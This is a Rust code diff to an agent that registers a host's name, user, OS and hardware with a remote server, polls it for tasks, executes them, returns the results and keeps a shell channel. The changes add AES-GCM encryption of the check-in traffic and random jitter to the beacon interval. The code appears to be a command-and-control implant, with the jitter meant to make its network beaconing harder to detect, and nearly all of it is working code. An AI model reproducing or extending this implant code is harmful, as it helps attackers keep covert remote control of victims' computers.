@@ -69,22 +69,24 @@ impl AgentEngine {
         let os_version = sys["osVersion"].as_str().unwrap_or("unknown");
         let arch = sys["arch"].as_str().unwrap_or("unknown");
 
-        let agent_id = http.register(
+        let (agent_id, session_key) = http.register(
             hostname, user_name, os_version, arch,
             self.crypto.rsa_public_key().unwrap_or(""),
             &hw_json,
         ).await?;
 
-        // Try to extract session key from registration response
-        if let Some(key) = extract_session_key(&agent_id) {
+        // Establish AES-256-GCM session key from the RSA-encrypted blob.
+        if let Some(key) = session_key {
             if let Err(e) = self.crypto.set_session_key(&key) {
                 eprintln!("[WARN] Failed to set session key: {}", e);
             } else {
                 eprintln!("[INFO] AES-256-GCM session key established");
             }
+        } else {
+            eprintln!("[WARN] Server did not return a session key (encryption disabled)");
         }
 
-        eprintln!("[INFO] registered | agent_id={} | hostname={}", self.agent_id, hostname);
+        eprintln!("[INFO] registered | agent_id={} | hostname={}", agent_id, hostname);
         self.agent_id = agent_id;
         self.http = Some(http);
 
@@ -118,16 +120,19 @@ impl AgentEngine {
 
         let (shell_tx, mut shell_rx) = tokio::sync::mpsc::unbounded_channel::<WebSocketMessage>();
         let mut shell_session: Option<ShellSession> = None;
-        let mut hb_interval = tokio::time::interval(
-            std::time::Duration::from_millis(self.config.heartbeat_interval_ms)
-        );
+        let hb_key = self.crypto.session_key();
+        let hb_interval_ms = self.config.heartbeat_interval_ms;
+        let hb_jitter = self.config.jitter_percent;
 
-        // Spawn heartbeat task using its own HTTP client (no encryption for now)
+        // Spawn heartbeat task using its own HTTP client, AES-GCM encrypted
+        // with the session key, with per-tick jitter.
         tokio::spawn(async move {
             let hb_http = HttpCommunicator::new(&server_url, &register_path, &heartbeat_path, &result_path);
             loop {
-                hb_interval.tick().await;
-                let _ = heartbeat_tick(&hb_http, &agent_id).await;
+                let _ = heartbeat_tick(&hb_http, &agent_id, hb_key.as_ref()).await;
+                tokio::time::sleep(std::time::Duration::from_millis(
+                    jittered_interval(hb_interval_ms, hb_jitter),
+                )).await;
             }
         });
 
@@ -741,13 +746,11 @@ fn data_u64(data: &Option<Value>, key: &str, default: u64) -> u64 {
         .unwrap_or(default)
 }
 
-fn extract_session_key(response: &str) -> Option<Vec<u8>> {
-    let search = "\"session_key\":\"";
-    let start = response.find(search)? + search.len();
-    let end = response[start..].find('"')?;
-    let b64 = &response[start..start + end];
-    use base64::Engine as _;
-    base64::engine::general_purpose::STANDARD.decode(b64).ok()
+fn jittered_interval(base_ms: u64, jitter_percent: f64) -> u64 {
+    use rand::Rng;
+    let mut rng = rand::thread_rng();
+    let jitter = (base_ms as f64 * jitter_percent * (rng.gen::<f64>() * 2.0 - 1.0)) as i64;
+    (base_ms as i64 + jitter).max(500) as u64
 }
 
 async fn ws_send(tx: &WsSender, agent_id: &str, msg_type: &str, data_str: &str, rid: Option<&str>) {
@@ -786,8 +789,12 @@ fn now_millis() -> i64 {
 
 // ── Heartbeat ────────────────────────────────────────────────────────────
 
-async fn heartbeat_tick(http: &HttpCommunicator, agent_id: &str) -> Result<(), String> {
-    let task = http.heartbeat(agent_id).await?;
+async fn heartbeat_tick(
+    http: &HttpCommunicator,
+    agent_id: &str,
+    session_key: Option<&[u8; 32]>,
+) -> Result<(), String> {
+    let task = http.heartbeat(agent_id, session_key).await?;
     if let Some(ref task) = task {
         eprintln!("[RECV] task | id={} | type={:?} | cmd={} | timeout={}s",
             task.id,
@@ -797,7 +804,7 @@ async fn heartbeat_tick(http: &HttpCommunicator, agent_id: &str) -> Result<(), S
         );
         let result = execute_task(task).await;
         eprintln!("[SEND] task_result | id={} | len={}", task.id, result.len());
-        let _ = http.submit_result(agent_id, &result).await;
+        let _ = http.submit_result(agent_id, &result, session_key).await;
     }
     Ok(())
 }
